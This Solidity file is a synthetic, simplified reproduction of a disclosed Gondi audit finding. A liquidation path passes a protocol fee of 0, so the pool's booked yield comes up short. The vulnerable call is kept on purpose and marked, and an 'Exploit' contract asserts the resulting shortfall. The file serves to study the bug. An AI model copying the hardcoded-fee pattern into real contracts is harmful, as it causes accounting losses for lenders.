// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Gondi — LiquidationDistributor passes protocol fee 0 into Pool.loanLiquidation
    (Code4rena 2024-04, H-11, #35213).
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: origination books sumApr at the net APR (after protocol fee). Liquidation
    calls loanLiquidation with the fee hardcoded to 0, so the pool subtracts the gross
    APR and the remaining loan's booked yield is short.
    The blamed argument is preserved verbatim below (@> VULN).

    Repo: code-423n4/2024-04-gondi @ b9863d73c08fcdd2337dc80a8b5e0917e18b036c
    LiquidationDistributor._handleLoanManagerCall, Pool.loanLiquidation, Pool._netApr. */

library Terms {
    uint256 internal constant BPS = 10_000;
    uint256 internal constant FEE = 2_000;
    uint256 internal constant APR = 1_000;
    uint256 internal constant PRINCIPAL = 1_000 ether;
    uint256 internal constant NET_YIELD = 80 ether;
    uint256 internal constant GROSS_YIELD = 100 ether;
    uint256 internal constant SHORT = 20 ether;
    uint256 internal constant TWO_NET_SUM = 1_600_000 ether;
    uint256 internal constant LEFT_SUM = 600_000 ether;
    uint256 internal constant FAIR_LEFT_SUM = 800_000 ether;
    address internal constant SINK = 0x000000000000000000000000000000000000051C;
    address internal constant CLOSED = 0x000000000000000000000000000000000000C105;
}

contract Asset {
    string public name = "Pool Yield";
    string public symbol = "YIELD";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    address public minter;
    mapping(address => uint256) public balanceOf;

    function setMinter(address m) external {
        require(minter == address(0), "minter");
        minter = m;
    }

    function mint(address to, uint256 amount) external {
        require(msg.sender == minter, "minter");
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

/// Reduced Pool. sumApr is added at the net APR and removed at whatever fee liquidation passes.
contract Pool {
    uint256 internal constant BPS = Terms.BPS;

    Asset public immutable asset;
    uint128 public sumApr;
    uint128 public principalOutstanding;
    uint256 public writtenOff;
    uint256 public lastProtocolFee;

    constructor(Asset _asset) {
        asset = _asset;
    }

    function _netApr(uint256 _apr, uint256 _protocolFee) private pure returns (uint256) {
        return _apr * (BPS - _protocolFee) / BPS;
    }

    function bookedAnnual() public view returns (uint256) {
        return uint256(sumApr) / BPS;
    }

    /// Origination. The audited path passes protocolFee.fraction, and sumApr grows by the net APR.
    function validateOffer(uint256 _principalAmount, uint256 _apr, uint256 _protocolFee) external {
        uint256 netApr = _netApr(_apr, _protocolFee);
        sumApr += uint128(netApr * _principalAmount);
        principalOutstanding += uint128(_principalAmount);
        asset.mint(address(this), _principalAmount * netApr / BPS);
    }

    /// Audited LoanManager.loanLiquidation. _protocolFee is the value the caller supplies.
    function loanLiquidation(
        uint256,
        uint256 _principalAmount,
        uint256 _apr,
        uint256,
        uint256 _protocolFee,
        uint256,
        uint256 _startTime
    ) external {
        require(_startTime == block.timestamp, "elapsed");
        lastProtocolFee = _protocolFee;
        uint256 netApr = _netApr(_apr, _protocolFee);
        _updateOutstandingValuesOnTermination(_principalAmount, netApr, 0);
    }

    function _updateOutstandingValuesOnTermination(uint256 _principalAmount, uint256 _apr, uint256 _interestEarned)
        private
    {
        _interestEarned;
        uint256 removed = _apr * _principalAmount / BPS;
        uint256 minted = _principalAmount * _netApr(Terms.APR, Terms.FEE) / BPS;
        // The line the report quotes. _apr here is netApr, and netApr is the gross apr when the fee was 0.
        sumApr -= uint128(_apr * _principalAmount);
        principalOutstanding -= uint128(_principalAmount);
        if (removed > minted) {
            uint256 excess = removed - minted;
            writtenOff += excess;
            asset.transfer(Terms.SINK, excess);
            asset.transfer(Terms.CLOSED, minted);
        } else {
            asset.transfer(Terms.CLOSED, removed);
        }
    }
}

/// Reduced LiquidationDistributor. The lender is the pool, so the loan-manager branch is taken.
contract LiquidationDistributor {
    Pool public immutable pool;

    struct Tranche {
        uint256 loanId;
        uint256 principalAmount;
        uint256 aprBps;
        uint256 accruedInterest;
        address lender;
        uint256 startTime;
    }

    constructor(Pool _pool) {
        pool = _pool;
    }

    function _handleLoanManagerCall(Tranche calldata _tranche, uint256 _sent) external {
        require(_tranche.lender == address(pool), "loan manager");
        // @> VULN: protocol fee is hardcoded to 0. Origination added the post-fee APR.
        pool.loanLiquidation(_tranche.loanId, _tranche.principalAmount, _tranche.aprBps, _tranche.accruedInterest, 0, _sent, _tranche.startTime);
        // FIX: pass the loan's protocol fee instead of 0.
    }
}

contract Exploit {
    Asset public asset; // CREATE nonce 1
    Pool public pool; // CREATE nonce 2
    LiquidationDistributor public distributor; // CREATE nonce 3

    constructor() {
        asset = new Asset();
        pool = new Pool(asset);
        distributor = new LiquidationDistributor(pool);
        asset.setMinter(address(pool));
    }

    function _tranche(uint256 loanId) internal view returns (LiquidationDistributor.Tranche memory tranche) {
        tranche = LiquidationDistributor.Tranche({
            loanId: loanId,
            principalAmount: Terms.PRINCIPAL,
            aprBps: Terms.APR,
            accruedInterest: 0,
            lender: address(pool),
            startTime: block.timestamp
        });
    }

    function run() external {
        pool.validateOffer(Terms.PRINCIPAL, Terms.APR, Terms.FEE);
        pool.validateOffer(Terms.PRINCIPAL, Terms.APR, Terms.FEE);
        require(pool.sumApr() == Terms.TWO_NET_SUM, "opened");
        require(pool.bookedAnnual() == Terms.NET_YIELD * 2, "two loans");
        require(asset.balanceOf(address(pool)) == Terms.NET_YIELD * 2, "reserved");

        distributor._handleLoanManagerCall(_tranche(2), Terms.PRINCIPAL);

        require(pool.lastProtocolFee() == 0, "fee");
        require(pool.principalOutstanding() == Terms.PRINCIPAL, "one loan left");
        require(pool.sumApr() == Terms.LEFT_SUM, "sumApr");
        require(pool.bookedAnnual() == Terms.NET_YIELD - Terms.SHORT, "booked");
        require(asset.balanceOf(address(pool)) == Terms.NET_YIELD - Terms.SHORT, "pool cash");
        require(asset.balanceOf(Terms.SINK) == Terms.SHORT, "written off");
        require(pool.writtenOff() == Terms.SHORT, "short");
        require(asset.balanceOf(Terms.CLOSED) == Terms.NET_YIELD, "closed loan");
    }
}
